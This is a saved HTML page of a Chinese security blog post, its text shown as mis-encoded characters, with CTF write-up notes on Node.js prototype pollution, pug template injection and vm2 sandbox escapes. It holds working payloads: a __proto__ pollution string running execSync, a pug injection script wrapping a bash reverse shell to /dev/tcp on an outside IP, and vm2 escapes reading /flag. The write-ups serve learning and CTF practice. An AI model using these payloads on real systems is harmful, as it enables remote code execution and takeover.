<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>nodejsç›¸å…³ | ch3n9w ã® è¶…å…ƒåŸŸ</title>
<meta name="keywords" content="">
<meta name="description" content="ä¸ä¼šjavascript, åœ¨çœ‹smi1eå¸ˆå‚…å…³äºåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„åšå®¢æ—¶å€™, è¿™å¼ å›¾ç‰‡è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:title" content="nodejsç›¸å…³" />
<meta property="og:description" content="ä¸ä¼šjavascript, åœ¨çœ‹smi1eå¸ˆå‚…å…³äºåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„åšå®¢æ—¶å€™, è¿™å¼ å›¾ç‰‡è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-11-17T16:15:38+00:00" />
<meta property="article:modified_time" content="2019-11-17T16:15:38+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="nodejsç›¸å…³"/>
<meta name="twitter:description" content="ä¸ä¼šjavascript, åœ¨çœ‹smi1eå¸ˆå‚…å…³äºåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„åšå®¢æ—¶å€™, è¿™å¼ å›¾ç‰‡è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.cpolar.cn/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "nodejsç›¸å…³",
      "item": "https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "nodejsç›¸å…³",
  "name": "nodejsç›¸å…³",
  "description": "ä¸ä¼šjavascript, åœ¨çœ‹smi1eå¸ˆå‚…å…³äºåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„åšå®¢æ—¶å€™, è¿™å¼ å›¾ç‰‡è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…\n",
  "keywords": [
    
  ],
  "articleBody": "ä¸ä¼šjavascript, åœ¨çœ‹smi1eå¸ˆå‚…å…³äºåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„åšå®¢æ—¶å€™, è¿™å¼ å›¾ç‰‡è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…\nå¾ˆå‹‰å¼ºçš„è‡ªå·±ç»™è‡ªå·±æ‰¾åˆ°ä¸€ä¸ªæ¯”å–»: cat.prototypeæ˜¯ä¸€ä¸ªå¯¹è±¡, æ¯”ä½œä»“åº“, ä»“åº“é‡Œé¢æœ‰æŒ‰ç…§ä¸€å®šé¡ºåºæ‘†æ”¾çš„è´§ç‰©, constructoræ˜¯åœ¨è¿™äº›è´§ç‰©çš„åŸºç¡€ä¸Šåšçš„ä¿®æ”¹, æ¯”å¦‚å¢åŠ ä»€ä¹ˆä¸œè¥¿å‡å»ä»€ä¹ˆä¸œè¥¿æ”¹å˜ä»€ä¹ˆä¸œè¥¿çš„é¡ºåºä¹‹ç±»çš„. æ²¡æœ‰constructor, ä»“åº“å°±æ˜¯é™æ€çš„ä¸€ä¸ªä»“åº“, ä¹Ÿå°±æ˜¯å¯¹è±¡, ä½†æ˜¯å¦‚æœå°†constructorå®æ–½çš„è¯, å°±æ˜¯äº§ç”Ÿä¸€ä¸ªæ‹¥æœ‰æ–°è´§ç‰©çš„ä»“åº“, ä¹Ÿå°±æ˜¯catå®ä¾‹å¯¹è±¡, é‚£ä¹ˆç±»åˆæ˜¯ä»€ä¹ˆæ¦‚å¿µ? å°±åƒæ˜¯ç»™ä»“åº“å®šä¸‹ä¸€ä¸ªæ•´ç†è®¡åˆ’, è¿™ä¸ªè®¡åˆ’å«åšconstructor, è€Œè¿™ä¸ªè®¡åˆ’è¿˜æ²¡æœ‰å®æ–½, ä½ è¯´ä»–æ˜¯é™æ€çš„ä»“åº“(å¯¹è±¡)ä¼¼ä¹ä¸å¦¥, å› ä¸ºæœ‰è®¡åˆ’çš„å­˜åœ¨, è¿™ä¸ªä»“åº“æ˜¯å¯å˜çš„, è¿™ä¸ªçŠ¶æ€å¯ä»¥å˜åŒ–çš„ä»“åº“å°±å«åšç±».\nå½“ç„¶è¿™ç§æ¯”å–»å¾ˆç‰µå¼º, æˆ‘ä¹Ÿä¸çŸ¥é“åˆä¸åˆç†, ä¹Ÿåªæ˜¯ä¸ºäº†æ›´å¥½ç†è§£åŸå‹é“¾æ±¡æŸ“è€Œåšçš„è‡†æƒ³â€¦\nç„¶åå¯¹äºpå¸ˆå‚…åšå®¢ä¸­å†™é“å…³äºå­—å…¸èµ‹å€¼protoæ— æ•ˆçš„é—®é¢˜,å®éªŒäº†ä¸€ä¸‹:\nå­—å…¸åœ¨åˆ›ç«‹çš„æ—¶å€™åº”è¯¥æ˜¯å…ˆåˆ›ç«‹å­—å…¸å†…çš„é¡¹ç„¶åå°†ä»–ä»¬èšåˆèµ·æ¥, é‚£ä¹ˆåœ¨åˆ›ç«‹açš„æ—¶å€™å…ˆåˆ›ç«‹çš„æ˜¯açš„åŸå‹, ç„¶åå†åˆ›ç«‹çš„a, è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆbarä¼ ä¸åˆ°Objectä¸­å»,è€Œæ˜¯ä¼ å…¥äº†Objectçš„ä¸‹ä¸€çº§, ä¹Ÿå°±æ˜¯açš„åŸå‹.\nNPUCTF 2020 éªŒè¯ğŸ å‚è€ƒ\nhttps://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/\næ˜¥ç§‹æˆ˜ç–«èµ› Ez_express æºä»£ç å¦‚ä¸‹\nindex.js\nvar express = require('express'); var router = express.Router(); const isObject = obj =\u003e obj \u0026\u0026 obj.constructor \u0026\u0026 obj.constructor === Object; // è¿™ä¸ªmergeå¯ä»¥é€ æˆåŸå‹é“¾æ±¡æŸ“ const merge = (a, b) =\u003e { for (var attr in b) { if (isObject(a[attr]) \u0026\u0026 isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a } // cloneå’Œmergeæ•ˆæœä¸€æ · const clone = (a) =\u003e { return merge({}, a); } function safeKeyword(keyword) { if(keyword.match(/(admin)/is)) { return keyword } return undefined } router.get('/', function (req, res) { if(!req.session.user){ res.redirect('/login'); } res.outputFunctionName=undefined; res.render('index',data={'user':req.session.user.user}); }); router.get('/login', function (req, res) { res.render('login'); }); router.post('/login', function (req, res) { if(req.body.Submit==\"register\"){ // è¿™é‡Œsafekeywordå°±æ˜¯ä¸è®©é€šè¿‡ADMINè¿›è¡Œæ³¨å†Œ if(safeKeyword(req.body.userid)){ res.end(\"\") } req.session.user={ // toUpperCase()é™¤äº†æ­£å¸¸çš„å¤§å°å†™è½¬åŒ–ä¹‹å¤–ä¼šå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œä¸€ä¸ªè½¬åŒ– 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } res.redirect('/'); } else if(req.body.Submit==\"login\"){ if(!req.session.user){res.end(\"\")} if(req.session.user.user==req.body.userid\u0026\u0026req.body.pwd==req.session.user.passwd){ req.session.user.isLogin=true; } else{ res.end(\"\") } } res.redirect('/'); ; }); router.post('/action', function (req, res) { if(req.session.user.user!=\"ADMIN\"){res.end(\"\")} // è¿™é‡Œæœ‰è§¦å‘åŸå‹é“¾æ±¡æŸ“çš„æœºä¼š req.session.user.data = clone(req.body); res.end(\"\"); }); router.get('/info', function (req, res) { res.render('index',data={'user':res.outputFunctionName}); }) module.exports = router; è¦è§¦å‘åŸå‹é“¾æ±¡æŸ“æœ‰ä¸ªå‰ææ¡ä»¶: ç™»å½•admin, çœ‹æºç çš„æ„æ€å°±æ˜¯é¦–å…ˆéœ€è¦æ³¨å†Œä¸€ä¸ªADMIN, ä½†æ˜¯safekeywordå‡½æ•°å°†è¿™ä¸ªæ“ä½œé™åˆ¶ä½äº†, ç„¶è€ŒtoUpperCaseæœ‰å­—ç¬¦è½¬åŒ–çš„ç‰¹ç‚¹, å‚è€ƒ\nhttps://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html\nå› æ­¤ä½¿ç”¨admÄ±n å’Œéšæ„çš„å¯†ç å»æ³¨å†Œä¸€ä¸ªç”¨æˆ·, å°±å¯ä»¥ç™»å½•adminäº†, ç™»å½•adminä¹‹åé€šè¿‡actionå‘é€å¦‚ä¸‹æ•°æ®åŒ…\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;return global.process.mainModule.constructor._load('child_process').execSync('ls');//\"}} å‘é€å®Œä¹‹åè®¿é—®ä¸€ä¸‹/infoå°±æ‹¿åˆ°äº†flag\nhttps://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501\n[https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md?tdsourcetag=s_pctim_aiomsg](https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split second/split second.md?tdsourcetag=s_pctim_aiomsg)\n2019 XNUCA hardjs å¤ç° é¡µé¢åŠŸèƒ½: æ³¨å†Œ ç™»å½• å‘è¡¨è¯„è®º\næ‹¿åˆ°æºä»£ç ä¹‹åé¦–å…ˆä½¿ç”¨å‘½ä»¤npm auditæ¥è‡ªåŠ¨æ£€æµ‹ä¸€ä¸‹æ˜¯å¦æœ‰å­˜åœ¨æ¼æ´çš„ä¾èµ–åŒ…\nä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“æ¼æ´, å¥½çš„. çœ‹ä¸‹lodashæ˜¯å¹²å•¥çš„\næŸ¥çœ‹æºä»£ç éƒ¨åˆ†çœ‹çœ‹åœ¨å“ªé‡Œç”¨åˆ°äº†è¿™ä¸ªlodash\nå¤§æ„æ˜¯è®¿é—®/getè·¯ç”±å°±ä¼šä»æ ¹æ®useridä»æ•°æ®åº“ä¸­æŸ¥è¯¢å‡ºæ¶ˆæ¯, åˆ¤æ–­æ¡æ•°, å¦‚æœå¤§äº5æ¡çš„è¯, å°±ä¼šå¯¹æ¯ä¸€æ¡éƒ½è¿›è¡Œä¸€ä¸ªlodash.defaultsDeepå‡½æ•°å¤„ç†, æŸ¥æŸ¥çœ‹payload\nconst mergeFn = require('lodash').defaultsDeep; const payload = '{\"constructor\": {\"prototype\": {\"a0\": true}}}' function check() { mergeFn({}, JSON.parse(payload)); if (({})[`a0`] === true) { console.log(`Vulnerable to Prototype Pollution via ${payload}`); } } check(); é‚£ä¹ˆæ„é€ ä¸€ä¸ªç±»ä¼¼çš„åº”è¯¥å°±å¯ä»¥æ±¡æŸ“ä»»æ„å‚æ•°äº†.\nç„¶åæ€è·¯æ˜¯æƒ³é€šè¿‡xssè®©å¯¹é¢çš„botå°†ä½œä¸ºflagçš„passwordå‘é€å‡ºæ¥, ä½†æ˜¯å’Œä¼ ç»Ÿçš„å‘é€urlé“¾æ¥è®©å¯¹é¢botæŸ¥çœ‹çš„æ–¹å¼ä¸ä¸€æ ·, æˆ‘ä»¬æ²¡æœ‰è¿™ä¹ˆä¸ªç©æ„. é‚£ä¹ˆæƒ³è¦xssæ€ä¹ˆåŠ? åªèƒ½ä¼ªé€ ç™»å½•è¿›botçš„è´¦å·, å†åœ¨botçš„æ¶ˆæ¯åˆ—è¡¨ä¸­æ’å…¥xssä»£ç , ç­‰å¯¹é¢æŸ¥çœ‹çš„æ—¶å€™å°±å¯ä»¥è§¦å‘äº†, é‚£ä¹ˆæ€ä¹ˆä¼ªé€ ç™»å½•å‘¢?\næŸ¥çœ‹ä¸€ä¸‹ç™»å½•éªŒè¯çš„ä»£ç \nå¥½, é‚£ä¹ˆå¯ä»¥è€ƒè™‘ä¸€ä¸‹æŠŠloginè¿˜æœ‰useridè¿™ä¿©éƒ½ç»™æ±¡æŸ“æˆtrue\nå¤šå‘å‡ æ¬¡ç„¶åè·¯ç”±è®¿é—®/getå»è§¦å‘ä¸€ä¸‹, æŠŠcookieéƒ½åˆ æ‰é‡æ–°è®¿é—®åå°±ä¼šå‘ç°æˆåŠŸä»¥userid=1çš„èº«ä»½ç™»å½•äº†.\nç™»å½•å®Œä¹‹åå°±è¦è€ƒè™‘æ€ä¹ˆåœ¨é¡µé¢ä¸­æ’å…¥xssä»£ç äº†\nåœ¨app.jsä¸­æœ‰è¿™ä¹ˆä¸€æ®µ\nè¿™ä¸ª$.extendç›¸å½“äºåˆå¹¶æ•°ç»„, è¿™ç§æ“ä½œä¹Ÿå¯ä»¥é€ æˆåŸå‹é“¾æ±¡æŸ“,CVE-2019-11358 å†æ¥çœ‹é¡µé¢æ¸²æŸ“çš„éƒ¨åˆ†\nä¼šæŠŠç¬¦åˆæ¡ä»¶çš„hintsæ ‡ç­¾éƒ½æ‹¿å‡ºæ¥æ¸²æŸ“ä¸€é, åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå°†æ²™ç›’ä½œç”¨åœ¨è¿™äº›æ ‡ç­¾ä¸Š\nä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨å¦‚å›¾åœ°æ–¹ç›´æ¥å†™xssä»£ç ä¼šæ— æ•ˆçš„åŸå› \nè§‚å¯Ÿæ¸²æŸ“æ¨¡æ¿index.ejs, å‘ç°æœ‰ä¸€ä¸ªæ ‡ç­¾loggerä¸åœ¨æ²™ç›’é™åˆ¶ä¸­å¹¶ä¸”ç¬¦åˆæ¡ä»¶, é‚£ä¹ˆ, å¯ä»¥æ±¡æŸ“hintsè®©ä»–çš„åŸå‹ä¸­åŒ…å«loggerä»è€Œè®©hintsåœ¨éå†çš„è¿‡ç¨‹ä¸­éå†åˆ°loggerç„¶åå»æ¸²æŸ“ä»–, loggeré‡Œçš„å†…å®¹è‡ªç„¶æ˜¯postè¡¨å•äº†.\nè¿˜æœ‰ä¸€ç§è§£æ³•, ç­‰æˆ‘ä¼šè°ƒè¯•jsäº†å°±å»è¡¥\njade pug æ¨¡æ¿æ³¨å…¥ const pug=require('pug'); pug.render('#{console.log(\"1\")}'); pug.render('-console.log(1)'); renderfileä¹Ÿå¯ä»¥æ¨¡æ¿æ³¨å…¥\ncmd = 'bash -i \u003e\u0026 /dev/tcp/192.168.220.157/8888 0\u003e\u00261' payload = \"process.binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','%s'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})\" % cmd pug = ('''-[][\"constructor\"][\"constructor\"](\"{}\")()'''.format(payload)).replace('\"','%22').replace(\"'\",\"%27\") # pug = ('''#{[][\"constructor\"][\"constructor\"](\"%s\")()}'''%(payload)).replace('\"','%22').replace(\"'\",\"%27\") print quote(pug) https://mp.weixin.qq.com/s/rIXIfhw3vcM9PVJI6HTq2g\nè™ç¬¦æ¯ 2020 JustEscape ç”±è¿™ä¸ªé¢˜ç›®è€Œæ¥\nhttps://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS\nå¯ä»¥é€šè¿‡ä»¥ä¸‹å½¢å¼æ¥è¿›è¡Œè®¡ç®—\nhttp://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1-1 ä½†æ˜¯\nhttp://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1%2b1 ä¼šå¾—åˆ°\nä»åæ¥çš„è¡¨ç°æ¥çœ‹, æ˜¯è¢«è¿‡æ»¤äº†.\nçœ‹é¢˜ç›®çš„æç¤º,å¯èƒ½åç«¯ä¸æ˜¯php, çœ‹åˆ°æ’ä»¶wappalyzeræ˜¾ç¤º\nè€Œä¸”, Date()å‡½æ•° åœ¨javascriptä¸­å¯ä»¥ç”¨, ä¸å¸¦å‚æ•°. phpä¸­æ²¡æœ‰.æ‰€ä»¥å¯ä»¥åˆ¤æ–­åç«¯å…¶å®æ˜¯nodejså†™çš„.\nç”¨Error().stackæ¥è·å–å¯ä»¥ä½¿ç”¨çš„æ¨¡å—ä¿¡æ¯.\nError at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) ä½¿ç”¨payload, ä»https://github.com/patriksimek/vm2/issues/225 æ‰¾åˆ°çš„æœ€æ–°çš„.\n?code[]=try{Buffer.from(new Proxy({}, {getOwnPropertyDescriptor(){throw f=\u003ef.constructor(\"return process\")();}}));}catch(e){e(()=\u003e{}).mainModule.require(\"child_process\").execSync(\"cat /flag\").toString();} åŸé¢˜çš„payloadåœ¨è¿™é‡Œæ‰“ä¸äº†\nvar process; try{ Object.defineProperty(Buffer.from(\"\"),\"\",{ value:new Proxy({},{ getPrototypeOf(target){ if(this.t) throw Buffer.from; this.t=true; Object.getPrototypeOf(target); } }) }); }catch(e){ trueprocess = e.constructor(\"return process\")(); } process.mainModule.require(\"child_process\").execSync(\"ls\").toString() ",
  "wordCount" : "407",
  "inLanguage": "en",
  "datePublished": "2019-11-17T16:15:38Z",
  "dateModified": "2019-11-17T16:15:38Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w ã® è¶…å…ƒåŸŸ",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.cpolar.cn/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w ã® è¶…å…ƒåŸŸ (Alt + H)">
                <img src="https://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w ã® è¶…å…ƒåŸŸ</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.cpolar.cn/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.cpolar.cn/">Home</a>&nbsp;Â»&nbsp;<a href="https://ch3n9w.cpolar.cn/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      nodejsç›¸å…³
    </h1>
    <div class="post-meta"><span title='2019-11-17 16:15:38 +0000 UTC'>November 17, 2019</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;407 words&nbsp;Â·&nbsp;ch3n9w

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#npuctf-2020-éªŒè¯">NPUCTF 2020 éªŒè¯ğŸ</a></li>
    <li><a href="#æ˜¥ç§‹æˆ˜ç–«èµ›-ez_express">æ˜¥ç§‹æˆ˜ç–«èµ› Ez_express</a></li>
    <li><a href="#2019-xnuca-hardjs-å¤ç°">2019 XNUCA hardjs å¤ç°</a>
      <ul>
        <li><a href="#jade-pug-æ¨¡æ¿æ³¨å…¥">jade pug æ¨¡æ¿æ³¨å…¥</a></li>
      </ul>
    </li>
    <li><a href="#è™ç¬¦æ¯-2020-justescape">è™ç¬¦æ¯ 2020 JustEscape</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>ä¸ä¼šjavascript, åœ¨çœ‹smi1eå¸ˆå‚…å…³äºåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„åšå®¢æ—¶å€™, è¿™å¼ å›¾ç‰‡è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…</p>
<p><img loading="lazy" src="/images/javascript-learn/image-20211114141704409.png" alt="image-20211114141704409"  />
</p>
<p>å¾ˆå‹‰å¼ºçš„è‡ªå·±ç»™è‡ªå·±æ‰¾åˆ°ä¸€ä¸ªæ¯”å–»: cat.prototypeæ˜¯ä¸€ä¸ªå¯¹è±¡, æ¯”ä½œä»“åº“, ä»“åº“é‡Œé¢æœ‰æŒ‰ç…§ä¸€å®šé¡ºåºæ‘†æ”¾çš„è´§ç‰©, constructoræ˜¯åœ¨è¿™äº›è´§ç‰©çš„åŸºç¡€ä¸Šåšçš„ä¿®æ”¹, æ¯”å¦‚å¢åŠ ä»€ä¹ˆä¸œè¥¿å‡å»ä»€ä¹ˆä¸œè¥¿æ”¹å˜ä»€ä¹ˆä¸œè¥¿çš„é¡ºåºä¹‹ç±»çš„. æ²¡æœ‰constructor, ä»“åº“å°±æ˜¯é™æ€çš„ä¸€ä¸ªä»“åº“, ä¹Ÿå°±æ˜¯å¯¹è±¡, ä½†æ˜¯å¦‚æœå°†constructorå®æ–½çš„è¯, å°±æ˜¯äº§ç”Ÿä¸€ä¸ªæ‹¥æœ‰æ–°è´§ç‰©çš„ä»“åº“, ä¹Ÿå°±æ˜¯catå®ä¾‹å¯¹è±¡, é‚£ä¹ˆç±»åˆæ˜¯ä»€ä¹ˆæ¦‚å¿µ? å°±åƒæ˜¯ç»™ä»“åº“å®šä¸‹ä¸€ä¸ªæ•´ç†è®¡åˆ’, è¿™ä¸ªè®¡åˆ’å«åšconstructor, è€Œè¿™ä¸ªè®¡åˆ’è¿˜æ²¡æœ‰å®æ–½, ä½ è¯´ä»–æ˜¯é™æ€çš„ä»“åº“(å¯¹è±¡)ä¼¼ä¹ä¸å¦¥, å› ä¸ºæœ‰è®¡åˆ’çš„å­˜åœ¨, è¿™ä¸ªä»“åº“æ˜¯å¯å˜çš„, è¿™ä¸ªçŠ¶æ€å¯ä»¥å˜åŒ–çš„ä»“åº“å°±å«åšç±».</p>
<p>å½“ç„¶è¿™ç§æ¯”å–»å¾ˆç‰µå¼º, æˆ‘ä¹Ÿä¸çŸ¥é“åˆä¸åˆç†, ä¹Ÿåªæ˜¯ä¸ºäº†æ›´å¥½ç†è§£åŸå‹é“¾æ±¡æŸ“è€Œåšçš„è‡†æƒ³&hellip;</p>
<p>ç„¶åå¯¹äºpå¸ˆå‚…åšå®¢ä¸­å†™é“å…³äºå­—å…¸èµ‹å€¼protoæ— æ•ˆçš„é—®é¢˜,å®éªŒäº†ä¸€ä¸‹:</p>
<p><img loading="lazy" src="/images/javascript-learn/image-20211114141713445.png" alt="image-20211114141713445"  />
</p>
<p>å­—å…¸åœ¨åˆ›ç«‹çš„æ—¶å€™åº”è¯¥æ˜¯å…ˆåˆ›ç«‹å­—å…¸å†…çš„é¡¹ç„¶åå°†ä»–ä»¬èšåˆèµ·æ¥, é‚£ä¹ˆåœ¨åˆ›ç«‹açš„æ—¶å€™å…ˆåˆ›ç«‹çš„æ˜¯açš„åŸå‹, ç„¶åå†åˆ›ç«‹çš„a, è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆbarä¼ ä¸åˆ°Objectä¸­å»,è€Œæ˜¯ä¼ å…¥äº†Objectçš„ä¸‹ä¸€çº§, ä¹Ÿå°±æ˜¯açš„åŸå‹.</p>
<h2 id="npuctf-2020-éªŒè¯">NPUCTF 2020 éªŒè¯ğŸ<a hidden class="anchor" aria-hidden="true" href="#npuctf-2020-éªŒè¯">#</a></h2>
<p>å‚è€ƒ</p>
<p><a href="https://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/">https://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/</a></p>
<h2 id="æ˜¥ç§‹æˆ˜ç–«èµ›-ez_express">æ˜¥ç§‹æˆ˜ç–«èµ› Ez_express<a hidden class="anchor" aria-hidden="true" href="#æ˜¥ç§‹æˆ˜ç–«èµ›-ez_express">#</a></h2>
<p>æºä»£ç å¦‚ä¸‹</p>
<p>index.js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span> =&gt; <span style="color:#a6e22e">obj</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">constructor</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">constructor</span> <span style="color:#f92672">===</span> Object;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// è¿™ä¸ªmergeå¯ä»¥é€ æˆåŸå‹é“¾æ±¡æŸ“
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">merge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">attr</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">b</span>) {
